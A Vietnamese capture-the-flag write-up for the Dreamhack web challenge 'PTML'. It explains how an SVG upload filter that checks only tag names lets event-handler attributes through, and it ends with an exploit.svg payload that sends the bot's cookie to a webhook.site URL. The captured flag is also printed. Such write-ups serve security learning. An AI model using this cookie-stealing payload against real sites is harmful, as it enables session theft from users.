---
title: PTML
date: 2026-10-21
ctf: Dreamhack
category: web
difficulty: Bronze 1
tags:
  - XSS
  - SVG
  - PyScript
  - innerHTML
  - Cookie Stealing
---

# Đề bài
This is a service that shows SVG files separately.

Find vulnerabilities in services and exploit them to earn flags!

The flag format is DH {...} This is it.
https://dreamhack.io/wargame/challenges/1937
# Solution
## 1. Flag nằm ở đâu — đọc `app.py`
Inspect code, ta thấy flag được giữ tại cookie của bot
```python
try:
    FLAG = open("./flag", "r").read()
except:
    FLAG = "[FLAG]"
```
Flag được nạp vào biến `FLAG`.
![image](https://hackmd.io/_uploads/SyUdRpniMg.png)
```python
def read_file(filename):
    cookie = {"name": "flag", "value": FLAG}        # (1) bot cầm flag trong COOKIE
    cookie.update({"domain": "127.0.0.1"})          #     và cookie này KHÔNG có HttpOnly
    ...
    driver.get("http://127.0.0.1:8000/")            # mở trang gốc trước
    driver.add_cookie(cookie)                       # gắn cookie flag vào
    driver.get(f"http://127.0.0.1:8000/?file=uploads/{filename}")   # (2) mở đúng file mình vừa upload
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "svg")))
```
1. Flag nằm trong cookie tên `flag`, và cookie này không có cờ `HttpOnly`. Cờ `HttpOnly` nếu bật thì JavaScript không đọc được cookie bằng `document.cookie`. Ở đây không bật nên đọc được `document.cookie` để lấy flag.
2. Upload xong là bot chạy liền (`read_file` gọi ngay trong `/upload`).
3. Bot mở `http://127.0.0.1:8000/?file=uploads/<file-của-mình>`. JS của mình sẽ chạy trong cùng origin `127.0.0.1:8000` với cookie nên đọc được cookie thoải mái.

=> Vậy để lấy được flag, ta phải để cookie chảy về website mà ta kiểm soát (ở đây tôi sử dụng [webhook](https://webhook.site/#!/view/7d8586dc-1810-4e8d-bea6-a865704b1ff0) để đọc được cookie)

File ta gửi là file [.svg](https://developer.mozilla.org/en-US/docs/Web/SVG)
:::info
## SVG inline trong HTML → KHÔNG cần namespace

Nếu bạn viết SVG thẳng trong file `.html`:
```xml
<body>
  <svg width="100" height="100"><circle r="40"/></svg>   ← không có xmlns vẫn chạy
</body>
```
→ Trình duyệt dùng HTML parser. Parser này có luật đặc biệt: hễ gặp thẻ ``<svg>`` là tự động nhét nó (và các thẻ con) vào SVG namespace, bất kể bạn có khai báo `xmlns` hay không. Nên inline SVG khỏi cần namespace.

## SVG đứng một mình (file `.svg`, hoặc parse bằng XML) → BẮT BUỘC có namespace

Khi SVG được load như một tài liệu độc lập:

Mở file `.svg` trực tiếp
Dùng trong `<img src="x.svg">`, `<object>`, `background: url(x.svg)`
Parse bằng `DOMParser(..., "image/svg+xml")`

→ Trình duyệt dùng XML parser. XML thì namespace-aware (quan tâm namespace tuyệt đối). Nếu bạn viết `<svg>` mà không có `xmlns="http://www.w3.org/2000/svg"`, thì về mặt XML đó chỉ là một thẻ tên “svg” nằm trong namespace rỗng (`null`) — không phải SVG thật → trình duyệt không vẽ ra gì cả.
:::

## 2. SVG được hiển thị ra sao — đọc `main.py`

File này là PyScript: về bản chất là Python nhưng chạy trong trình duyệt (qua Pyodide), gọi được các API DOM như JS. Nó làm nhiệm vụ: lấy nội dung SVG rồi vẽ lên trang.

### 2.1. Nó lấy tên file từ URL

```python
async def main():
    file = window.location.search.split('file=')[1] if 'file=' in window.location.search else 'uploads/default.svg'
    await fetch_svg(file)        # tải nội dung file SVG về
```

```python
async def fetch_svg(file):
    response = await pyfetch(file)
    svg_content = await response.text()   # svg_content = toàn bộ nội dung file SVG (dạng chuỗi)
    load_new_svg(svg_content)
```

Tức là nội dung file mình upload sẽ chui vào biến `svg_content` (một chuỗi text).

### 2.2. Bộ lọc (`load_svg_from_string`)

```python
def load_svg_from_string(svg_string):
    parser = DOMParser.new()
    doc = parser.parseFromString(svg_string, "image/svg+xml")   # parse kiểu XML

    # chặn 1: thẻ gốc phải là <svg> và namespace phải đúng
    if doc.documentElement.tagName != "svg" or \
       doc.documentElement.namespaceURI not in ["http://www.w3.org/2000/svg", "x"]:
        raise ValueError("Root element is not <svg> or has incorrect namespace")

    allowed_elements = [
        "svg","path","rect","circle","ellipse","line","polyline","polygon",
        "text","tspan","textPath", ...,
        "animate","animateColor","animateMotion","animateTransform",   # <-- để ý mấy thẻ này
        "mpath","set","desc","title","metadata","defs","g","symbol","use",
        "image","switch","style"
    ]

    # chặn 2: mọi thẻ trong file phải nằm trong danh sách cho phép
    elements = doc.getElementsByTagName("*")
    for element in elements:
        if element.tagName not in allowed_elements:
            raise ValueError(f"Disallowed SVG element found: {element.tagName}")

    return doc.documentElement
```

Ta thấy trong filter này có 2 lỗ hổng để khai thác:
1. Chỉ kiểm tra `<tag>` mà không kiểm tra `attribute` (Vòng `for` chỉ so `element.tagName` với danh sách)
2. Danh sách cho phép có mấy thẻ hoạt ảnh `animate`, `set`, `animateTransform`. Mấy thẻ SVG này có các event handler riêng: `onbegin`, `onend`, `onrepeat` (chạy khi animation bắt đầu/kết thúc/lặp). Kết hợp với không soi attribute.
→ Ta có thể để payload là `<animate onbegin="<JS độc hại>">`

### 2.3. Chỗ render trang - `load_new_svg` (đây là nơi kích hoạt XSS giúp lấy về cookie)

```python
def load_new_svg(svg_content):
    svg_container = document.getElementById('svg-container')
    original_svg_content = document.getElementById('original-svg-content')

    try:
        svg_element = load_svg_from_string(svg_content)   # validate (parse rồi check)
    ...
    original_svg_content.innerHTML = svg_content       # (SINK #1) đổ nguyên CHUỖI gốc vào innerHTML
    ...
    svg_element = load_svg_from_string(svg_content)    # parse lại lần nữa
    svg_container.innerHTML = ""
    svg_container.appendChild(svg_element)             # (SINK #2) gắn NODE đã parse vào trang

    initialize_svg_mover(svg_content)                  # (bên trong lại appendChild lần nữa)
```
Hai dòng `innerHTML` và `appendChild` chính là nơi SVG được đưa vào trang hiển thị, là 2 sink để kích hoạt DOM XSS.
## 3. Thí nghiệm "0 / 1 / 2" để xem DOM XSS kích hoạt lúc nào
Để hiểu rõ hơn về challenge, ta cần phân biệt được điều kiện kích hoạt XSS lúc nào.

Không phải cứ parse SVG là nguy hiểm.
Đoạn test sau dùng biến đếm `__hit`: mỗi lần đoạn `onbegin` chạy thì `__hit` cộng 1 nên nhìn `__hit` là biết JS có được kích hoạt hay không.
![image](https://hackmd.io/_uploads/SkWSk7aofe.png)

-> hàm `load_svg_from_string` không kích hoạt XSS mà là hàm `load_new_svg` với cả `innerHTML` và `appendChild` ở trong

| Bước | Làm gì | `__hit` | Ý nghĩa |
|------|--------|---------|---------|
| A | Parse SVG nhưng để node rời, không gắn vào trang | 0 | Chỉ parse thì JS không chạy. |
| B | `appendChild` node đó vào trang sống | 1 | Vừa gắn vào trang là JS nổ. `appendChild` ở SINK #2 đủ để dính. |
| C | `innerHTML` chuỗi SVG vào trang sống | 2 | Cũng nổ. `innerHTML` ở SINK #1 là một đường nữa. |

## 4. `xmlns` (namespace)
Theo như đã nói đến ở [trên](#SVG-inline-trong-HTML-→-KHÔNG-cần-namespace), file bắt buộc phải có namespace và ở `main.py` có điều kiện để kiểm tra điều đó
```python
if doc.documentElement.tagName != "svg" or doc.documentElement.namespaceURI not in ["http://www.w3.org/2000/svg", "x"]:
```
Nên trong payload ta phải để `xmlns="http://www.w3.org/2000/svg"` hoặc `xmlns="x"` với mục đích chỉ là để qua bước validate.

## 5. Payload
Tạo file `exploit.svg`:
```xml
<svg xmlns='x'>
<image href="1" onerror="location.href='https://webhook.site/3b7373b6-0109-4087-baec-b83716b6858b/?c='+document.cookie" />
</svg>
```
:::warning
Ở đây element `<image>` của SVG khác khi sử dụng attribute `href` so với `<img>` của HTML sử dụng `src`
![image](https://hackmd.io/_uploads/r1B31o8hzg.png)
`HTML:  <img src="...">      ← src là đúng`
`SVG:   <image href="...">   ← href mới là đúng`
:::
Sau khi upload file `exploit.py` vừa tạo, `webhook` nhận được tín hiệu và ta có được flag
![image](https://hackmd.io/_uploads/BJdTgiInMg.png)
-> Flag:
`DH{29574df83b25cc88123ffc2fdf572cdd92f95054b8bc95c525a6070a28a48a8b}`
